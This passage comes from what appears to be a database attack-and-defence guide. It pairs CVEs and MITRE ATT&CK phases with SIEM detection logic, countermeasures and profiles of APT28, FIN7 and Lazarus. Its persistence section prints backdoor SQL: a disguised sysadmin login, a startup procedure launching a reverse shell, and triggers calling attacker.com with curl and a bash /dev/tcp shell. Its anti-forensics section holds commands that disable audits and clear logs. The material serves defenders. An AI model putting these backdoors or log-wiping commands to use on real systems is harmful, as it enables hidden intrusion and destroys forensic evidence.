🔍 SOC / SIEM Detection Logic

Alert on: multiple connection attempts to DB ports (1433, 3306, 5432, 1521) from non-application hosts within a short window. Monitor threat intel feeds for your org's public IPs appearing in Shodan. Integrate GitGuardian or GitHub Advanced Security to detect credential pushes in real time.   • OWASP ASVS V6: Never store credentials in source code. Implement secrets management (HashiCorp Vault, AWS Secrets Manager).
  • Enable GitHub Advanced Security secret scanning and push protection on all repositories.

CVE-2020-14882 / CVE-2020-14883 | CVSS 9.8 | Oracle WebLogic RCE (DB Access Chain)
Authentication bypass in Oracle WebLogic Server Console allowed unauthenticated attackers to execute arbitrary commands. Frequently chained with Oracle DB exploitation — attacker accesses the management console, then pivots to the connected Oracle DB using harvested credentials from the WebLogic config. Actively exploited by multiple APT groups within 48 hours of disclosure.
🔍 SOC / SIEM Detection Logic

Alert on: successful authentication to DB from non-whitelisted IP ranges, especially with default usernames (sa, root, postgres). Monitor for authentication failures exceeding threshold (>10 attempts/minute per source IP). Enable SQL Server Audit and MySQL General Query Log for authentication events. SIEM rule: event_type=db_auth AND username IN ("sa","root","postgres","SYSTEM") AND src_ip NOT IN trusted_subnets

🛡 Countermeasures
  • NIST SP 800-53 IA-5: Authenticator management — enforce password complexity, disable default accounts immediately post-installation.
  • CIS Control 5.2: Use unique passwords and disable any default passwords.
  • Bind DB listeners to loopback (127.0.0.1) or internal VLANs only. Never expose port 1433/3306/5432 directly to the internet.
  • On PostgreSQL: configure pg_hba.conf with scram-sha-256 for all remote connections. Remove trust entries.
  • Disable MongoDB's legacy bind_ip=0.0.0.0 default and enable mandatory auth from first deployment.

CVE-2023-23397 | CVSS 9.8 | Microsoft Outlook NTLM Hash Leak (SQLi chain enabler)
Zero-click Outlook vulnerability where a crafted appointment triggers an outbound NTLM authentication attempt. Frequently used by APT28 as a reconnaissance step before pivoting to MSSQL servers in the same AD environment via captured NTLM hashes. Demonstrates how DB exploitation rarely starts at the DB port.
🔍 SOC / SIEM Detection Logic

Monitor web application logs for anomalous SQL patterns: single quotes, comment sequences (--, /**/), SLEEP/WAITFOR keywords in URL parameters. WAF solutions (ModSecurity CRS Rule 942100 family) detect SQLi patterns. Alert on rapid 5xx errors from a single IP following 200 responses — often indicates SQLi probing. Burp Suite proxy logs in authorized environments reveal exact payloads used.

🛡 Countermeasures
  • OWASP ASVS V5.3.4: Use parameterized queries / prepared statements exclusively. ORM alone is not sufficient if raw queries are still used.
  • NIST SP 800-53 SI-10: Information input validation — implement server-side allowlisting. Client-side validation is trivially bypassed.
  • Configure detailed database error handling: never expose raw SQL errors to end users. Use generic error messages in production.
  • Deploy a WAF with OWASP Core Rule Set (CRS) in blocking mode. Tune for false positives before enabling.

CVE-2019-1068 | CVSS 8.8 | SQL Server Remote Code Execution
Full-text search component of Microsoft SQL Server allowed authenticated attackers to execute arbitrary code via a crafted query. Severity demonstrates that authenticated low-privilege DB users can escalate to OS-level code execution — making initial access via SQLi a critical stepping stone to full system compromise.
🔍 SOC / SIEM Detection Logic

Enable database-level query logging and alert on: large UNION SELECT payloads in query logs, SLEEP()/WAITFOR in application queries, outbound DNS from the DB server to unexpected domains (OOB indicator), queries involving information_schema from application accounts, and anomalous data volume in single query responses. For second-order: implement query pattern monitoring at the ORM level.

🛡 Countermeasures
  • OWASP A03:2021 — Injection: Parameterized queries, stored procedures with input validation, and ORM usage as primary mitigations.
  • NIST SP 800-53 SI-10: Enforce least privilege — application DB accounts should only have SELECT/INSERT/UPDATE on required tables, never DBA-level rights.
  • Block outbound DNS from DB server hosts at the firewall level to prevent OOB exfiltration.
  • For MongoDB: disable the $where operator and JavaScript execution unless strictly required. Use schema validation to prevent operator injection in expected string fields.

CVE-2018-1058 | CVSS 8.8 | PostgreSQL Superuser Privilege Escalation via Search Path
A low-privilege PostgreSQL user could escalate to superuser by creating objects in the public schema that override built-in functions. When a superuser later calls an affected function, the attacker's code executes under the superuser context. CVSS 8.8 — requires only a valid low-privilege account.
🔍 SOC / SIEM Detection Logic

MSSQL: Alert on any xp_cmdshell invocation in SQL audit logs — this should never occur in production unless pre-authorized. PostgreSQL: Alert on COPY FROM PROGRAM statements. MySQL: Monitor plugin directory for unexpected new .so files. At OS level: monitor for new child processes spawned from sqlservr.exe, mysqld, or postgres processes.   • PostgreSQL: revoke pg_read_server_files and pg_execute_server_program from all non-DBA roles. Audit public schema permissions regularly.
  • NIST SP 800-53 AC-6: Least privilege principle — application accounts should have no ability to modify configurations or invoke OS commands.

CVE-2021-1636 | CVSS 8.0 | SQL Server Privilege Escalation
An authenticated SQL Server user could escalate privileges to DBA level via a flaw in DBCC command handling. Combined with credential stuffing against the sa account, this allowed external attackers to achieve full DBA access and subsequently use xp_cmdshell for OS command execution. 🔍 SOC / SIEM Detection Logic

Alert on: queries against sys.sql_logins, pg_shadow, or mysql.user from non-DBA application accounts.   • Enable MSSQL audit for access to sys.sql_logins. PostgreSQL: revoke SELECT on pg_shadow from all non-superuser accounts.

🔍 SOC / SIEM Detection Logic

DNS exfil indicators: unusually long DNS query names (>50 char subdomains), high volume of DNS queries to a single domain from the DB host, queries with high entropy subdomain labels (Base32/Hex-encoded data), DNS to recently registered domains. Network rule: dns.query.name length > 52 AND dns.src_ip IN db_server_range. Monitor for file creation in web root directories by DB process identities.

🛡 Countermeasures
  • DB servers should route DNS through an internal resolver only — block direct outbound UDP 53 to external IPs from DB hosts.
  • NIST SP 800-53 SI-4: Information system monitoring — deploy DNS Security (e.g. Cisco Umbrella, Infoblox) with threat intel feeds to detect DGA and tunneling patterns.
  • CIS Control 13.8: Deploy a data loss prevention (DLP) solution. At minimum, monitor for large SELECT * operations against sensitive tables from application-tier accounts.
  • MySQL/PostgreSQL: restrict FILE privilege to DBA accounts only. Remove it from application service accounts with REVOKE FILE ON *.* FROM 'appuser'@'%'.
08

Persistence & Backdooring

Attacker Objective

Maintain access to the compromised database after initial exploitation is discovered or credential rotation occurs. Database-layer persistence is particularly resilient because it often survives OS-level remediation — DBAs frequently focus OS hardening without auditing stored procedures, triggers, and rogue user accounts.

MITRE ATT&CK

TA0003 – Persistence

T1136 – Create Account

T1505.001 – SQL Stored Procedure

Persistence Techniques
Rogue DB Users & Stored Procedure BackdoorsPersistence
-- MSSQL: Create hidden sysadmin account with misleading name
CREATE LOGIN [NT SERVICE\MSSQLSERVER] WITH PASSWORD='P@ssw0rd!', CHECK_POLICY=OFF;
EXEC sp_addsrvrolemember 'NT SERVICE\MSSQLSERVER', 'sysadmin';
-- Name mimics a legitimate Windows service account — easily overlooked

-- MSSQL: Stored procedure backdoor executing on startup
USE master;
CREATE PROCEDURE sp_health_check AS
  EXEC xp_cmdshell 'powershell -w hidden -enc [ENCODED_REVERSE_SHELL]';
EXEC sp_procoption 'sp_health_check', 'startup', true;
-- Executes every time MSSQL service starts

-- MySQL: Trigger-based persistence (executes on every user login)
CREATE TRIGGER after_login AFTER INSERT ON audit_log
FOR EACH ROW BEGIN
  CALL sys_exec('curl http://attacker.com/ping');
END;

-- PostgreSQL: Event trigger (fires on DDL events — very resilient)
CREATE OR REPLACE FUNCTION malicious_fn() RETURNS event_trigger AS $$
  BEGIN
    PERFORM pg_sleep(0);  -- Replace with actual payload
    COPY shell_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
  END;
$$ LANGUAGE plpgsql;
🔍 SOC / SIEM Detection Logic

Alert on: new SQL login creation events (MSSQL Event ID 33205), stored procedures added with sp_procoption startup=true, CREATE TRIGGER / CREATE EVENT TRIGGER DDL events from non-DBA accounts, any use of xp_cmdshell within stored procedures. Baseline all stored procedures and triggers at deployment, alert on any deviation. Schedule weekly audits: SELECT name,create_date FROM sys.procedures WHERE create_date > DATEADD(day,-7,GETDATE())

🛡 Countermeasures
  • NIST SP 800-53 AC-2: Account management — implement automated alerting for new privileged database account creation. Review and certify all DB accounts quarterly.
  • CIS Control 16.13: Alert on account creation on Enterprise Assets. Map DB account creation to this control.
  • Maintain signed checksums of all stored procedures and triggers. Any modification should trigger a security review workflow.
  • Disable sp_procoption startup procedures unless operationally required. Audit regularly with SELECT name FROM sys.procedures WHERE OBJECTPROPERTY(object_id, 'ExecIsStartup')=1.
09

Covering Tracks

Attacker Objective + MITRE Mapping

Erase evidence of compromise from DB audit logs, transaction logs, and OS event logs. The goal is to delay or prevent incident detection, destroy forensic artifacts, and extend dwell time. Notably, DB-layer log manipulation requires the same privileges used for exploitation — so evidence of privilege abuse often predates log clearing.

TA0005 – Defense Evasion   T1070.002 – Clear Linux/Mac System Logs   T1562.006 – Disable/Modify Audit Logs

Log Manipulation Techniques
DB Log Manipulation CommandsAnti-Forensics
-- MSSQL: Truncate transaction log (prevents forensic timeline reconstruction)
USE target_db;
BACKUP LOG target_db TO DISK='NUL' WITH TRUNCATE_ONLY;
-- Or set recovery model to SIMPLE to auto-truncate:
ALTER DATABASE target_db SET RECOVERY SIMPLE;

-- MSSQL: Disable SQL Server Audit
ALTER SERVER AUDIT MyAudit WITH (STATE=OFF);
DROP SERVER AUDIT MyAudit;   -- Removes audit entirely

-- MySQL: Flush general query log
SET GLOBAL general_log = 'OFF';
FLUSH LOGS;
# OS level (if xp_cmdshell/UDF): clear the log file
echo "" > /var/log/mysql/mysql.log

-- PostgreSQL: Disable logging via config reload (if superuser)
ALTER SYSTEM SET logging_collector = 'off';
SELECT pg_reload_conf();

# Windows Event Log clearing (via xp_cmdshell on MSSQL host)
EXEC xp_cmdshell 'wevtutil cl Security';
EXEC xp_cmdshell 'wevtutil cl Application';

# Timestomping — modify file timestamps on log files
Forensic Note: Paradoxically, covering tracks often generates its own forensic artifacts. MSSQL audit of the audit-disabling event, Windows Security Event 1102 (audit log cleared), and gaps in log timestamps are all high-confidence indicators of post-exploitation activity for a skilled DFIR analyst. Log clearing is itself a SIEM alerting event.
🔍 SOC / SIEM Detection Logic

Windows Event ID 1102 (audit log cleared) and 4719 (system audit policy changed) should trigger immediate Priority 1 alerts. MSSQL: alert on ALTER SERVER AUDIT and BACKUP LOG ... WITH TRUNCATE_ONLY statements. Forward logs to an immutable SIEM/log aggregator in real time — logs stored only on the compromised host are trivially destroyed. Use write-once storage (WORM) for compliance-critical audit logs per NIST SP 800-92.

🛡 Countermeasures
  • NIST SP 800-53 AU-9: Protection of audit information — audit logs must be stored on separate, access-controlled infrastructure that DB service accounts cannot reach.
  • CIS Control 8.2: Collect audit logs. Centralize to a SIEM with network-level transport (syslog/Filebeat) so logs leave the host immediately, before an attacker can clear them.
  • Grant audit log viewing to security team only. DB admins should not have permission to modify audit configuration without a separate approval workflow (4-eyes principle).
Threat Actor Profiles
APT groups that have historically weaponized database exploitation as part of intrusion chains
APT28 / Fancy Bear (GRU Unit 26165)
Russian State Espionage Active since 2004
Responsible for the 2016 Democratic National Committee breach and numerous government/military intrusions. APT28 chains SQL injection in public-facing web applications against MSSQL backends to establish initial database access, then pivots via xp_cmdshell to Windows host execution. Notably exploited CVE-2023-23397 (Outlook NTLM hash capture) to harvest credentials that were subsequently used for MSSQL authentication without ever triggering a SQLi alert. Their toolset includes X-Agent, Sofacy, and X-Tunnel for post-exploitation C2. MITRE ATT&CK Group: G0007.
FIN7 / Carbanak
Financially Motivated Cybercrime Active since 2013
Responsible for over $1 billion in financial sector losses. FIN7's primary vector against restaurant and retail chains was spear-phishing that installed CARBANAK malware, which specifically targeted POS systems' backend SQL Server databases to harvest payment card data. Their technique for lateral movement frequently involved extracting MSSQL service account NTLM hashes via network traffic capture and using those to authenticate to adjacent SQL Server instances in the same domain — a direct application of Phase 6's PtH technique. MITRE ATT&CK Group: G0046.
Lazarus Group (North Korea, Bureau 121)
Nation-State Financial Theft Active since 2009
Behind the 2016 Bangladesh Bank SWIFT heist ($81M stolen) where Oracle DB systems were compromised to manipulate SWIFT transaction records. Lazarus used stolen credentials to access Oracle databases, deleted transaction audit logs (Phase 9 directly applied), and modified stored procedures to approve fraudulent transfers. This is the canonical real-world example of persistence (stored procedure modification) and covering tracks (log deletion) in a database context having catastrophic financial consequences. MITRE ATT&CK Group: G0032.
